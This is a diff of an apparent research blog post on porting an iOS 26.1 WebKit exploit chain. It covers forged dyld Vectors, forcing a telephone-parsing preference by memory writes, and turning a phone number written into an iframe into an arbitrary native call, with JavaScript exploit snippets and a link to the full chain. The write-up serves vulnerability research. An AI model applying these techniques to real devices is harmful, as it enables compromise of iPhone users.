-        v1: '.allocator = RS+0xb8-0x10',
-        v2: '.allocator = RS+0xc0-0x10',
-        word: '0x01',
+        spare1: 'loading XOJIT',
+        word: 'count > gen (armed)',
         buf: 'dyld internal',
         size: '0x9',
       },
     },
     {
-      caption: 'Seed TT._lock with worker1 token, then hand the once-gate to the spare worker.',
-      active: ['spare'],
-      values: {
-        word: '0x01  silent',
-        spare: 'takes the gate (CAS)',
-        buf: 'dyld internal',
-        size: '0x9',
-      },
-    },
-    {
-      caption: 'Arm the drop with worker1 real park count, so the generation matches its wait.',
-      danger: ['word'],
-      active: ['spare'],
-      values: {
-        word: 'count > gen  (armed)',
-        spare: 'loading XOJIT',
-        buf: 'dyld internal',
-        size: '0x9',
-      },
-    },
-    {
-      caption: 'XOJIT static destructors register through __cxa_atexit. That release drops.',
-      active: ['spare', 'word'],
-      values: {
-        word: 'drop -> gen bumped',
-        spare: '~71 registrations',
-        buf: 'dyld internal',
-        size: '0x9',
-      },
-    },
-    {
-      caption: 'worker1 wakes and finishes its dlopen. Vector #1 is destroyed first.',
-      active: ['v1'],
+      caption: 'XOJIT static destructors release through __cxa_atexit. worker1 wakes and its free() writes the buffer.',
+      active: ['v1', 'spare1'],
       ok: ['buf'],
-      values: { v1: 'resize(0) -> free()', buf: 'OUR TUPLES', size: '0x9' },
+      values: { v1: 'resize(0) -> free()', spare1: '~71 registrations', buf: 'OUR TUPLES', size: '0x9' },
     },
     {
-      caption: 'Vector #2 destructs. The count lands, and the table is live.',
-      active: ['v2'],
+      caption: 'Now worker2 is parked. Forge its Vector on its frozen stack, aimed at RS+0xc0.',
+      danger: ['v2'],
+      values: {
+        v2: '.allocator = RS+0xc0-0x10',
+        buf: 'OUR TUPLES',
+        size: '0x9',
+      },
+    },
+    {
+      caption: 'Fire spare 2: fresh class, close its bitmap, load HomeUI through the borrow.',
+      active: ['spare2'],
+      values: {
+        spare2: 'loading HomeUI',
+        buf: 'OUR TUPLES',
+        size: '0x9',
+      },
+    },
+    {
+      caption: 'worker2 wakes and its free() writes the count. The table is live.',
+      active: ['v2', 'spare2'],
       ok: ['buf', 'size'],
       detail:
-        'Both writes were performed by dyld itself, through its own allocator, on its own TPRO-protected state.',
-      values: { v2: 'resize(0) -> free()', buf: 'OUR TUPLES', size: '0x109' },
+        'Both writes were performed by dyld itself, through its own allocator, on its own TPRO-protected state - one per parked worker.',
+      values: { v2: 'resize(0) -> free()', spare2: 'loaded', buf: 'OUR TUPLES', size: '0x109' },
     },
     {
       caption: 'Verify before proceeding: RS+0xb8 must equal our buffer, or the attempt is dead.',
@@ -1108,7 +1276,7 @@ The selection criterion for a wake vehicle is a C++ property of the target binar
   ]}
 />
 
-## Part 9 - From table to gadgets
+## Step 9 - From table to gadgets
 
 The table is live. Now we need it to hand us something callable.
 
@@ -1161,7 +1329,7 @@ void cv.offsetHeight // force style/layout so caption prefs resolve now
 
 No `src`, and deliberately no `play()`. A playing video re-invokes the interposed getter every frame, and since that getter is now a full `dlopen` + `dlsym` loop, the main thread pegs and the whole chain starves. The carrier is torn down immediately after the globals resolve, for the same reason.
 
-## Part 10 - slow_fcall
+## Step 10 - slow_fcall
 
 We have gadget addresses sitting in globals. What we still don't have is a way to **call** one with arguments of our choosing. The chain's answer is `TelephoneNumberDetector`, and it is one of the most beautiful pieces of the whole thing.
 
@@ -1243,13 +1411,76 @@ function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
 }
 ```
 
-And the trigger, on the main thread, is a single digit:
+### The gate that is a preference, not a check
+
+Those three writes only matter if `find()` ever runs, and on stock hardware it does not. `find()` is reached from `processCharacterBufferForInBody` - the HTML tree builder - and 26.1 gates that one call on `Document::isTelephoneNumberParsingEnabled()`, which reads **two bytes we had never touched**: `settings().telephoneNumberParsingEnabled` and the document's `m_isTelephoneNumberParsingAllowed`.
+
+The setting is declared `status:embedder` in `UnifiedWebPreferences.yaml`, and it **defaults to false**. HTML can reach the second byte - a `<meta name="format-detection">` tag flips `m_isTelephoneNumberParsingAllowed` - but that only helps if the first byte is already on, and the embedder preference itself is not something a web page can express. The vphone's browser opts in, so the scan fired and everything worked. A real iPhone loading the same page through a plain webview does not: the parser returns before it ever calls `find()`, the planted slot is never invoked, and the fcall sentinel survives untouched. We burned a full session on stock hardware with a correct interpose and correct gadgets before we looked here - the scan simply never ran.
+
+The fix is to open the gate ourselves. `Settings` is shared per-`Page`, so we walk the same `allScriptExecutionContextsMap` as Step 4 and force two bytes on every `HTMLDocument`. Two details nearly stopped us. First, the map stores the **`ScriptExecutionContext` subobject**, not the `Document` - the vtable at `ctx+0` is the secondary address point (`0x1f1367550` on 23B85, the primary plus `0x370`), and `Document = ctx - 0xd0`. Second, `Settings` is a runtime heap object, not cache-resident, so the "must live in the shared cache" plausibility check kept rejecting a perfectly good `0x10b…` pointer until we widened it:
 
 ```javascript
-iframe.contentDocument.write('<span data-mime-type="text/latex">1</span>')
+function armTelephoneGate() {
+  const tab = p.read64(offsets.WebCore__allScriptExecutionContextsMap_contexts)
+  const len = p.read64(tab - 8n) >> 32n
+  for (let i = 0n; i < len; ++i) {
+    const ctx = p.read64(tab + i * structs.ContextsMap_stride + structs.ContextsMap_value)
+    if (noPAC(p.read64(ctx)) !== offsets.WebCore__HTMLDocument_vtable) continue
+    const doc = ctx - 0xd0n // the map value is the SEC subobject, Document + 0xd0
+    const settings = p.read64(doc + 0x2d0n) // Document.m_settings (a heap object)
+    // write8 masks into the containing 64-bit word
+    p.write8(settings + 0x2d2n, (p.read64(settings + 0x2d0n) >> 16n & 0xffn) | 0x8n) // parsing enabled
+    p.write8(doc + 0xe0cn, (p.read64(doc + 0xe08n) >> 32n & 0xffn) | 0x1n) // allowed
+  }
+}
 ```
 
-That's it. A digit in a document is a native call. WebCore sees text worth scanning, believes Data Detectors is ready, calls the soft-link slot and passes it the scanner object - and the slot is our gadget, and the scanner object is our argument block.
+The preference is re-armed before every call, not just once: any load can reset the shared settings. And it is worth saying twice that this is **not a security check** - no PAC, no policy, no entitlement behind it. It is a default-false embedder flag sitting between a renderer primitive and the code path it wants. That is exactly why "works on my device" is a dangerous sentence in browser work, and exactly why the bypass is one byte.
+
+<StepAnim
+  title="The gate that is a preference: forcing the parser to call find()"
+  layout="row"
+  speed={2600}
+  boxes={[
+    { id: 'tb', label: 'processCharacterBuffer', sub: 'HTML tree builder' },
+    { id: 'pref', label: 'settings +0x2d2', sub: 'telephoneNumberParsingEnabled, bit 3' },
+    { id: 'allow', label: 'doc +0xe0c', sub: 'm_isTelephoneNumberParsingAllowed, bit 0' },
+    { id: 'find', label: 'find()', sub: 'TelephoneNumberDetector' },
+    { id: 'slot', label: 'softlink slot', sub: 'our gadget' },
+    { id: 'pc', label: 'gSecurityd[0x80]', sub: 'the call we wanted' },
+  ]}
+  frames={[
+    {
+      caption: 'On stock hardware the embedder pref defaults to FALSE: the tree-builder returns before it ever calls find().',
+      danger: ['pref'],
+      muted: ['find', 'slot', 'pc'],
+      values: { pref: 'FALSE', allow: '1' },
+    },
+    {
+      caption: 'The chain forces both bytes on every HTMLDocument in the context map.',
+      active: ['pref', 'allow'],
+      values: { pref: 'FORCED ON (0x8)', allow: 'FORCED ON (0x1)' },
+    },
+    {
+      caption: 'Now a phone number reaches find(), which reads the scanner object and blraaz\'s the softlink slot.',
+      active: ['find', 'slot'],
+      values: { find: 'scan "5551234567"' },
+    },
+    {
+      caption: 'The slot is our gadget: it loads x0..x2 from our buffer, calls the pc we stored in gSecurityd[0x80], and stores the result where we can read it.',
+      active: ['slot', 'pc'],
+      ok: ['pc'],
+    },
+  ]}
+/>
+
+The trigger, on the main thread, is a phone-shaped number:
+
+```javascript
+iframe.contentDocument.write('<span data-mime-type="text/latex">5551234567</span>')
+```
+
+That's it. A phone number in a document is a native call - provided the tree-builder gate is open. WebCore sees text worth scanning, believes Data Detectors is ready, calls the soft-link slot and passes it the scanner object - and the slot is our gadget, and the scanner object is our argument block.
 
 One extra bit of care: the securityd table we swap in is a **copy** of the real one, with only the single entry at `+0x80` replaced, and it is put back immediately after the call returns. Loading a fresh framework does code-signature validation, which goes through Security, so the real table has to be in place everywhere except the instant of our call.
 
@@ -1262,14 +1493,18 @@ const __mh = await p.slow_dlopen('/usr/lib/system/libsystem_malloc.dylib', 0n)
 const __ms = __mh !== 0n && __mh !== 0xdeaddeadn ? await p.slow_dlsym(__mh, 'malloc') : 0n
 if ((__ms & 0xffffffffffn) - p.slide !== 0x18e532040n) {
   postMessage(
-    `[stage5] fcall proof FAILED (handle=${hex(__mh)} malloc=${hex(__ms)}) -- aborting attempt`
+    `[stage7] fcall self-test FAILED (handle=${hex(__mh)} malloc=${hex(__ms)}) -- aborting attempt`
   )
   return false
 }
-postMessage(`[stage5] fcall proof OK (malloc=${hex(__ms)})`)
+postMessage(`[stage7] fcall self-test PASSED (malloc=${hex(__ms)})`)
 ```
 
 Resolving `malloc` through our own `dlopen`/`dlsym` and matching it against the known unslid offset is a small thing to print, but it means arbitrary native calls inside the WebContent sandbox, from a single JavaScript bug.
+
+![The chain running to completion on the research device (vphone): the dark console scrolls through the wake logs and the status bar settles on fcall self-test PASSED](/static/images/jsc/vphone-screenshot-2026-08-02T15-00-02Z.jpg)
+
+That is the whole thing on a screen. The top bar is the testbench, the dark console is the chain's own log stream (the `mapredir` fires, the interpose tuples, the caption carrier), and the green status is the fcall self-test passing end to end - every step of this post, live. The same run now reaches `PASSED` on a stock iPhone on the same build; the one wall the real device exposed that the vphone did not is the embedder preference in Step 10. The research device's configuration is a test condition, not a promise.
 
 ## The whole chain in one picture
 
@@ -1297,15 +1532,31 @@ Four threads, one loader, and a lock held at the right moment. If you read nothi
     {
       id: 'w1',
       label: 'worker1',
-      sub: 'the parked one',
+      sub: 'parked, writes the buffer',
       tone: 'proc',
       span: 3,
       rows: [{ id: 'act', k: 'doing', v: 'idle' }],
     },
     {
-      id: 'spare',
-      label: 'spare worker',
-      sub: 'runs the once-gate',
+      id: 'w2',
+      label: 'worker2',
+      sub: 'parked, writes the count',
+      tone: 'proc',
+      span: 3,
+      rows: [{ id: 'act', k: 'doing', v: 'idle' }],
+    },
+    {
+      id: 'spare1',
+      label: 'spare 1 (0x33333333)',
+      sub: 'fires XOJIT for worker1',
+      tone: 'proc',
+      span: 3,
+      rows: [{ id: 'act', k: 'doing', v: 'idle' }],
+    },
+    {
+      id: 'spare2',
+      label: 'spare 2 (0x44444444)',
+      sub: 'fires HomeUI for worker2',
       tone: 'proc',
       span: 3,
       rows: [{ id: 'act', k: 'doing', v: 'idle' }],
@@ -1328,6 +1579,17 @@ Four threads, one loader, and a lock held at the right moment. If you read nothi
         { id: 'gfunc', k: 'ImageIO gFunc globals', v: 'real CMPhoto symbols' },
       ],
     },
+    {
+      id: 'tnd',
+      label: 'WebCore telephone globals',
+      tone: 'dyld',
+      span: 5,
+      rows: [
+        { id: 'gate', k: 'parsing pref', v: 'default OFF' },
+        { id: 'slot', k: 'softlink slot', v: 'real DataDetectors fn' },
+        { id: 'scanner', k: 'scanner object', v: 'real scanner' },
+      ],
+    },
   ]}
   frames={[
     {
@@ -1338,9 +1600,11 @@ Four threads, one loader, and a lock held at the right moment. If you read nothi
     },
     {
       caption:
-        'Stage 2 - leak the JSC slide off parseFloat, then switch the garbage collector off.',
+        'Stage 2 - leak the JSC slide off parseFloat, switch the garbage collector off, disable the JIT.',
       active: ['chain.act'],
-      values: { 'chain.act': 'slide leaked, GC off' },
+      values: { 'chain.act': 'slide leaked, GC off, JIT off' },
+      detail:
+        'The JIT allowlist is written so every code block stays in the LLInt interpreter - nothing gets recompiled under the fakes.',
     },
     {
       caption:
@@ -1350,10 +1614,12 @@ Four threads, one loader, and a lock held at the right moment. If you read nothi
       values: {
         'chain.act': 'enumerating workers',
         'w1.act': 'found, port known',
-        'spare.act': 'found, port known',
+        'w2.act': 'found, port known',
+        'spare1.act': 'found, port known',
+        'spare2.act': 'found, port known',
       },
       detail:
-        'Those ports are what every lock on 26.1 checks. Collecting them now is what makes Part 7 possible.',
+        'Those ports are what every lock on 26.1 checks. Collecting them now is what makes Step 7 possible.',
     },
     {
       caption: 'Stage 4 - point the TextToSpeech bundle at our path, and hold the atexit mutex.',
@@ -1375,33 +1641,47 @@ Four threads, one loader, and a lock held at the right moment. If you read nothi
       values: { 'w1.act': 'PARKED mid-dlopen' },
     },
     {
-      caption: 'Stage 5 - the chain forges two Vectors on the stack worker1 just stopped using.',
+      caption: 'Stage 5 - forge worker1\'s Vector (the buffer leg) on the stack it just stopped using.',
       active: ['chain.act'],
       danger: ['w1.act'],
       link: { from: 'chain.act', to: 'w1.act', label: 'write64 the Vector', tone: 'danger' },
-      values: { 'chain.act': 'forging Vectors', 'w1.act': 'parked, stack edited' },
+      values: { 'chain.act': 'forging Vector (buffer)', 'w1.act': 'parked, stack edited' },
     },
     {
-      caption: 'The bundle cache is repointed at a borrowed bundle, and the spare runs the load.',
-      active: ['chain.act', 'spare.act'],
-      link: { from: 'chain.act', to: 'spare.act', label: 'hand over the gate' },
-      values: { 'chain.act': 'swap bundle map', 'spare.act': 'loading XOJIT' },
+      caption: 'The bundle cache is repointed at a borrowed bundle, and spare 1 fires the load.',
+      active: ['chain.act', 'spare1.act'],
+      link: { from: 'chain.act', to: 'spare1.act', label: 'hand over the gate' },
+      values: { 'chain.act': 'swap bundle map', 'spare1.act': 'loading XOJIT' },
       detail: 'The borrowed bundle is what keeps the wake away from the lock worker1 still owns.',
     },
     {
       caption: 'XOJIT static C++ destructors call __cxa_atexit. That release wakes worker1.',
-      active: ['spare.act', 'mutex.word'],
-      link: { from: 'spare.act', to: 'mutex.word', label: 'release -> wake' },
-      values: { 'spare.act': '~71 registrations', 'mutex.word': 'drop, worker1 woken' },
+      active: ['spare1.act', 'mutex.word'],
+      link: { from: 'spare1.act', to: 'mutex.word', label: 'release -> wake' },
+      values: { 'spare1.act': '~71 registrations', 'mutex.word': 'drop, worker1 woken' },
+    },
+    {
+      caption: 'worker1 finishes its dlopen. Its one free() writes the BUFFER at RS+0xb8.',
+      danger: ['w1.act'],
+      ok: ['rs.buf'],
+      link: { from: 'w1.act', to: 'rs.buf', label: 'free() writes', tone: 'danger' },
+      values: { 'w1.act': 'cleanup -> free()', 'rs.buf': 'OUR TUPLES', 'rs.size': '0x9' },
+      detail: 'dyld performed the write itself, on its own protected pages.',
     },
     {
       caption:
-        'worker1 finishes its dlopen, and its two frees write our buffer and count into dyld.',
-      danger: ['w1.act'],
+        'Stage 6 - forge worker2\'s Vector (the count leg) the same way, then fire spare 2 (HomeUI).',
+      active: ['chain.act', 'spare2.act'],
+      danger: ['w2.act'],
+      link: { from: 'chain.act', to: 'w2.act', label: 'write64 the Vector', tone: 'danger' },
+      values: { 'chain.act': 'forging Vector (count)', 'w2.act': 'parked, stack edited', 'spare2.act': 'loading HomeUI' },
+      detail: 'One parked worker, one write. worker2 takes the count.',
+    },
+    {
+      caption: 'HomeUI registers through __cxa_atexit. worker2 wakes and its free() writes the COUNT at RS+0xc0.',
+      active: ['w2.act', 'spare2.act'],
       ok: ['rs.buf', 'rs.size'],
-      link: { from: 'w1.act', to: 'rs.buf', label: 'free() writes', tone: 'danger' },
-      values: { 'w1.act': 'cleanup -> free()', 'rs.buf': 'OUR TUPLES', 'rs.size': '0x109' },
-      detail: 'dyld performed both writes itself, on its own protected pages.',
+      values: { 'w2.act': 'cleanup -> free()', 'spare2.act': 'loaded', 'rs.buf': 'OUR TUPLES', 'rs.size': '0x109' },
     },
     {
       caption: 'The page adds a caption track, and the interposed getter runs ImageIO resolver.',
@@ -1412,11 +1692,24 @@ Four threads, one loader, and a lock held at the right moment. If you read nothi
       detail: 'Apple own resolver writes correctly signed gadget pointers into the globals for us.',
     },
     {
-      caption: 'A digit written into an iframe becomes a native call through the Security gadget.',
+      caption: 'The chain points the softlink slot at the gadget, plants our argument block as the scanner object, and forces the embedder parsing pref on every HTMLDocument.',
+      active: ['chain.act'],
+      danger: ['tnd.gate'],
+      values: {
+        'chain.act': 'arm fcall trigger',
+        'tnd.gate': 'forced ON (0x8 + 0x1)',
+        'tnd.slot': 'our gadget',
+        'tnd.scanner': 'our arg block',
+      },
+      detail:
+        'On stock hardware the embedder pref defaults to FALSE, so without this the tree-builder never calls find() and the slot is never invoked.',
+    },
+    {
+      caption: 'A phone number written into an iframe becomes a native call through the Security gadget.',
       active: ['page.act', 'chain.act'],
       ok: ['rs.gfunc'],
       link: { from: 'page.act', to: 'chain.act', label: 'result back to JS' },
-      values: { 'page.act': "write '1' in a latex span", 'chain.act': 'slow_dlopen / slow_dlsym' },
+      values: { 'page.act': "write '5551234567' in a latex span", 'chain.act': 'slow_dlopen / slow_dlsym' },
     },
     {
       caption: 'Proof: malloc resolved through our own dlopen and dlsym matches the known offset.',
@@ -1430,32 +1723,23 @@ Four threads, one loader, and a lock held at the right moment. If you read nothi
         'chain.act': 'arbitrary fcall',
         'page.act': 'idle',
         'w1.act': 'done',
-        'spare.act': 'done',
+        'w2.act': 'done',
+        'spare1.act': 'done',
+        'spare2.act': 'done',
       },
     },
   ]}
 />
 
-## What we'd take away from this port
-
-A few things generalised beyond this specific chain.
-
-**When a check aborts, don't only ask how to satisfy it - ask what decides whether it runs.** The dyld lock was intractable as an owner-token problem and almost trivial once we looked at what gated the lock in the first place. Guarded critical sections are disable-by-zeroing primitives.
-
-**Verify the container before declaring a route impossible.** "This needs `setObject:forKey:`, which we don't have" was true of the dictionary we imagined and false of the `NSMapTable` that was actually there. The missing capability was imaginary.
-
-**When your own write reproduces the hardening, suspect your offset.** `+0x20` versus `+0` was the difference between "26.1 blocks this technique" and "this technique works".
-
-**18.6 tolerated approximate state; 26.1 asserts on it.** The waiter bit, the layout-lucky metadata, the plausible-looking token - each had to be replaced with a value derived from what the platform actually checks. That is most of what porting a chain across a major release really costs.
-
 ## What's next
 
-The call primitive is the foundation, not the goal. `slow_fcall` is slow (each call is a round trip through the page and a synthetic layout) and it runs inside the WebContent sandbox, which is deliberately a bad place to be. Part 3 is about what you build on top of it: a faster call primitive, and then the actual interesting question - getting out of the sandbox.
+The call primitive is the foundation, not the goal - and it now runs on stock hardware as well as the research device. `slow_fcall` is slow (each call is a round trip through the page and a synthetic layout) and it runs inside the WebContent sandbox, which is deliberately a bad place to be. Part 3 is about what you build on top of it: a faster call primitive, and then the actual interesting question - getting out of the sandbox.
 
 ## Resources
 
 - [DarkSword](https://github.com/ghh-jb/DarkSword) - the original chain this is a port of
 - [pois0nSword](https://github.com/GenericCoding/pois0nSword) - the iOS 26.1 port. Everything described in this post lives in that repo
 - [dyld source](https://github.com/apple-oss-distributions/dyld) - `lsl/Vector.h` and the allocator
-- [`dyld4::RuntimeState`](https://github.com/apple-oss-distributions/dyld/blob/main/dyld/DyldRuntimeState.h#L90) - the loader state object holding `interposingTuplesAll`
+- [dyld4::RuntimeState](https://github.com/apple-oss-distributions/dyld/blob/main/dyld/DyldRuntimeState.h#L90) - the loader state object holding `interposingTuplesAll`
+- [`_CFBundleLoadExecutableAndReturnError`](https://github.com/opensource-apple/CF/blob/master/CFBundle.c#L1935) - CoreFoundation's bundle loader, where `_isLoaded` gates the real `dlopen`
 - [Part 1 - From One OOB to Cage-Free Arbitrary R/W](https://varik.dev/blog/jsc/jsc-exploitation-primitives-part-1)
